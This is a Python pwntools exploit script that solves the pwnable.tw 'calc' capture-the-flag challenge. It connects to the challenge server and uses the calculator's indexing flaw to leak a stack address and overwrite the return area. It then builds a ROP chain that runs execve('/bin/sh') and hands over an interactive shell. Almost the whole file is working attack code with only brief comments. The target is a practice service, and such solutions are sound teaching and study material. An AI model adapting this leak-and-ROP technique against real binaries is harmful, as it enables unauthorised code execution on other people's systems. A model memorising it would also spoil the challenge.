from pwn import *



r = remote('chall.pwnable.tw',10100)
# r = process('./calc')

'''

    syscall exec:
        stack[0] = ptr to "/bin/sh" (arguments array start)
        stack[1] = ptr to null (arguments array end)

        eax = 0x0b
        ecx = ptr to "/bin/sh" (arguments)
        ebx = ptr to null (filename)
        edx = ptr to null (envp)

'''


def exp(id, gadget):
    r.sendline("+{}".format(str(id)))
    leak = int(r.recvline().strip())
    if (leak < 0):
        print("before: ", hex(leak)+(2*32))
    else:
        print("before: ", hex(leak))
    
    offset = gadget - leak
    if offset <  0:
        r.sendline("+{}{}".format(str(id), str(offset)))
    elif offset > 0:
        r.sendline("+{}+{}".format(str(id), str(offset)))

    leak = int(r.recvline().strip())
    if (leak < 0):
        print("\t\t\t\t\tafter: ", hex(leak+(2**32)))
    else:
        print("\t\t\t\t\tafter: ", hex(leak))


r.recvline()

# stack_id_end = 
# exp(361, 0x804947b) # main

r.sendline("+360") # at stack 
rop_start = int(r.recvline().strip()) + (2**32) - 0x1c
print("rop_start at: ", hex(rop_start))
pause()


rop_chain = [
    0x80e398d,          # pop eax
    0x0b,               # exec syscall
    0x80acefd,          # pop edx
    rop_start + 4*12 - (2**32),          # ptr to null
    0x80701d1,          # pop ecx; pop ebx
    rop_start + 4*8 - (2**32),          # some empty place
    rop_start + 4*10 - (2**32),          # ptr to /bin/sh
    0x8049a21,          # int 0x80
    rop_start + 4*10 - (2**32),
    0x0,
    0x6e69622f,         # /bin
    0x0068732f,         # /sh\x00
    0x0,
]
stack_id_start = 361
for gadget in rop_chain: 
    exp(stack_id_start, gadget) # pop eax
    stack_id_start += 1

# exp(361, 0x80e398d) # pop eax
# exp(362, 0x3b)
# exp(363, 0x80701aa) # pop edx
# exp(364, 0x80ed000) # some empty place
# exp(365, 0x80acefd) # pop esi
# exp(366, 0x80ed000) # some empty place
# exp(367, 0x80935ef) # pop edi
# exp(368, rop_start + 8*9) 
# exp(369, 0x8049a21) # int 0x80
# exp(370, 0x6e69622f)
# exp(371, 0x0068732f)
pause()
pause()

r.sendline("") # trigger return







r.interactive()
